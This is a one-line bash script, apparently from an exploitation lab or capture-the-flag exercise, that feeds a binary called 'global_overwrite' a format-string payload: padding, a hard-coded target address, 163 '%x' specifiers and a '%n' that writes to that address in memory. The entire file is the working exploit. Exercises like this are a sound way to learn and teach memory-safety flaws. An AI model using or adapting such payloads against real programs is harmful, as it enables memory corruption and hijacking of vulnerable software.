#!/bin/bash

./global_overwrite "$(python -c "print 'AAAAAAAAAAA' + '\x28\xa0\x04\x08' + 'AAAA' + '%x ' * 163 + '%n'")"
